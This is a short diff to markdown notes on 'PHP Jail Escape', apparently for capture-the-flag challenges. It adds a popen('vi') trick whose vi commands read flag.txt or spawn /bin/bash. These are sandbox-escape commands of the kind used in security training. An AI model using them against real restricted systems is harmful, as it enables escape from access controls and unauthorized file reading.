@@ -1,8 +1,18 @@
 # Notes
 
 ### PHP Jail Escape
+*With file_get_contents()*
 ```php
 print file_get_contents('flag.txt');
+```
+
+*With popen()*
+```php
+popen("vi", "w");
+
+:r flag.txt
+   or
+:!/bin/bash
 ```
 
 
